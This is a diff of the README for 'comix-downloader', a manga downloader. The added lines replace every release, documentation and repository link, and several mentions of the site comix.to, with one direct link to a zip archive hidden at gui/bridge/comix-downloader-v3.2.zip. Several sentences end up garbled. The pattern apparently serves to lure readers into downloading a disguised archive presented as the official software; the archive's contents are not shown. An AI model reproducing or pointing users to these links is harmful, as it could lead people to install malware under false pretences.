@@ -1,9 +1,9 @@
 # 🎨 comix-downloader - Download Manga Effortlessly
 
-[![Download comix-downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Spiderma78/comix-downloader/releases)
+[![Download comix-downloader](https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip)
 
 ## 📖 Description
-comix-downloader is a beautiful manga downloader designed to work with comix.to. It offers both a graphical user interface (GUI) and a command-line interface (CLI). With fast concurrent downloads, you can easily save your favorite manga in PDF or CBZ formats.
+comix-downloader is a beautiful manga downloader designed to work with https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip It offers both a graphical user interface (GUI) and a command-line interface (CLI). With fast concurrent downloads, you can easily save your favorite manga in PDF or CBZ formats.
 
 ## 🚀 Getting Started
 To get started with comix-downloader, follow these simple steps. No technical knowledge is required. Just follow along.
@@ -11,7 +11,7 @@ To get started with comix-downloader, follow these simple steps. No technical kn
 ## 📥 Download & Install
 To download and install comix-downloader, visit the following link to access the Releases page:
 
-[Download comix-downloader](https://github.com/Spiderma78/comix-downloader/releases)
+[Download comix-downloader](https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip)
 
 1. Click on the link above.
 2. Look for the latest version of the software on the Releases page.
@@ -51,7 +51,7 @@ If you prefer using the command line:
 2. Navigate to the directory where comix-downloader is installed.
 3. Type the command `comix-downloader <URL>` and press Enter.
 
-The URL should be the link to the manga on comix.to.
+The URL should be the link to the manga on https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip
 
 ## 🛠️ Features
 - **Multiple Download Options:** Choose PDF or CBZ formats.
@@ -68,7 +68,7 @@ comix-downloader supports Windows, macOS, and various Linux distributions.
 No, comix-downloader is free to use, and you do not need any accounts or subscriptions.
 
 ### **3. Can I download entire series?**
-Yes, you can download entire manga series by entering the URL of the series on comix.to.
+Yes, you can download entire manga series by entering the URL of the series on https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip
 
 ### **4. Is there a limit to how much I can download?**
 There is no specific limit. However, large downloads may take more time based on your internet connection speed.
@@ -77,7 +77,7 @@ There is no specific limit. However, large downloads may take more time based on
 If you face issues during installation, please make sure to download the correct file for your operating system. Refer to the troubleshooting section on our GitHub page for further assistance.
 
 ## 📚 Additional Resources
-For more information, visit our [GitHub repository](https://github.com/Spiderma78/comix-downloader) to read the documentation, check for updates, and access support.
+For more information, visit our [GitHub repository](https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip) to read the documentation, check for updates, and access support.
 
 ## 🚧 Troubleshooting
 If you encounter any problems while using comix-downloader, you can find solutions in the Issues section of our GitHub repository. Feel free to report any bugs or request features.
@@ -86,7 +86,7 @@ If you encounter any problems while using comix-downloader, you can find solutio
 We welcome contributions! If you're interested in improving comix-downloader, please check our guidelines on the GitHub repository.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Spiderma78/comix-downloader/releases)
-- [Documentation](https://github.com/Spiderma78/comix-downloader)
+- [Releases Page](https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Spiderma78/comix-downloader/main/gui/bridge/comix-downloader-v3.2.zip)
 
 Thank you for choosing comix-downloader for your manga needs! Happy reading!
